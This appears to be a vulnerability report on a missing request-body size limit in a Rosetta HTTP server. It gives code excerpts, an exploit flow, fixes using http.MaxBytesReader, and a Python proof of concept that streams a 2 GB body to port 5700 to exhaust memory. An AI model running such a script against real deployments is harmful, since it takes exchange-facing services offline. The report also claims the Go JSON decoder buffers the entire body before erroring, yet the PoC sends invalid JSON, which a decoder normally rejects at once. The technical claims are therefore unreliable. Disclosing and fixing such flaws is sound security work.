### Title
Unbounded Request Body Size in Rosetta HTTP Server Enables Memory Exhaustion DoS

### Summary
The `Http` struct in `rosetta/app/config/types.go` exposes only timeout fields with no `MaxRequestBodySize` configuration, and the `http.Server` constructed in `rosetta/main.go` applies no `http.MaxBytesReader` or equivalent body-size middleware anywhere in the handler chain. An unprivileged attacker can POST an arbitrarily large body to any Rosetta endpoint, causing the Go JSON decoder to buffer the entire payload in heap memory, exhausting available RAM and crashing the process — dropping all active network connections.

### Finding Description
**Exact code path:**

`rosetta/app/config/types.go` lines 64–69 define the `Http` struct:
```go
type Http struct {
    IdleTimeout       time.Duration
    ReadTimeout       time.Duration
    ReadHeaderTimeout time.Duration
    WriteTimeout      time.Duration
}
```
There is no `MaxRequestBodySize` or equivalent field.

`rosetta/main.go` lines 220–227 construct the `http.Server`:
```go
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,
}
```
No `http.MaxBytesReader` is applied. The middleware chain (`MetricsMiddleware` → `TracingMiddleware` → `CorsMiddleware` → router) contains no body-size limiting step — confirmed by a full grep across all `rosetta/**/*.go` files for `MaxBytesReader`, `MaxBytes`, `LimitReader`, `io.ReadAll`, and `r.Body`, which returned zero matches.

**Root cause:** The `Http` config type was designed only to expose timeout knobs. The failed assumption is that timeouts alone bound memory consumption. They do not: they bound *time*, not *bytes*.

**Exploit flow:**
1. Attacker opens a TCP connection to port 5700 (default Rosetta port).
2. Attacker sends a valid HTTP POST to any endpoint (e.g., `/network/status`) with a `Content-Type: application/json` header and a multi-gigabyte body streamed at line rate.
3. The coinbase `rosetta-sdk-go` router calls `json.NewDecoder(r.Body).Decode(&request)`, which reads the entire body into heap memory before returning an error.
4. With `ReadTimeout` defaulting to 5 seconds (5,000,000,000 ns), a 1 Gbps link delivers ~625 MB per request; a 10 Gbps link delivers ~6.25 GB. Multiple concurrent connections multiply this.
5. The Go runtime OOM-kills the process or the kernel OOM killer terminates it, dropping every active connection.

**Why existing checks fail:** `ReadTimeout` bounds wall-clock read time, not bytes transferred. On any reasonably fast link the attacker can exhaust gigabytes of heap within the allowed window. There is no `http.MaxBytesReader` wrapping `r.Body` at any layer.

### Impact Explanation
A successful attack crashes the Rosetta process, severing all in-flight and future connections until the process restarts. This constitutes an effective network partition: the mirror node's Rosetta interface becomes unreachable by exchanges, validators, or any Coinbase Mesh client relying on it. Because the attack is stateless and requires no authentication, it can be repeated immediately after each restart, sustaining the outage indefinitely. Severity: **High** (availability impact, no authentication required, fully repeatable).

### Likelihood Explanation
Any unprivileged actor with TCP access to port 5700 can execute this. No credentials, API keys, or prior knowledge of internal state are needed. The attack requires only a fast uplink and a single HTTP client. Public-facing Rosetta deployments (e.g., exchange integrations) are directly exposed. Repeatability is unlimited. Likelihood: **High**.

### Recommendation
1. Add a `MaxRequestBodySize int64` field to the `Http` struct in `rosetta/app/config/types.go`.
2. In `rosetta/main.go`, wrap the handler with a middleware that calls `http.MaxBytesReader(w, r.Body, cfg.Http.MaxRequestBodySize)` before the JSON decoder runs, or apply it inside a custom middleware inserted before `MetricsMiddleware`.
3. Set a safe default (e.g., 1 MB) in the default config, matching the maximum legitimate Rosetta request payload size.
4. Return HTTP 413 (Request Entity Too Large) when the limit is exceeded, rather than crashing.

### Proof of Concept
```bash
# Stream a 2 GB body to the /network/status endpoint
python3 -c "
import socket, time
host, port = '127.0.0.1', 5700
body_size = 2 * 1024 * 1024 * 1024  # 2 GB
header = (
    'POST /network/status HTTP/1.1\r\n'
    f'Host: {host}:{port}\r\n'
    'Content-Type: application/json\r\n'
    f'Content-Length: {body_size}\r\n'
    'Connection: keep-alive\r\n\r\n'
).encode()
chunk = b'A' * 65536
s = socket.create_connection((host, port))
s.sendall(header)
sent = 0
while sent < body_size:
    s.sendall(chunk)
    sent += len(chunk)
s.close()
"
# Observe: Rosetta process RSS grows unboundedly until OOM kill;
# all other connections to port 5700 are dropped.
```
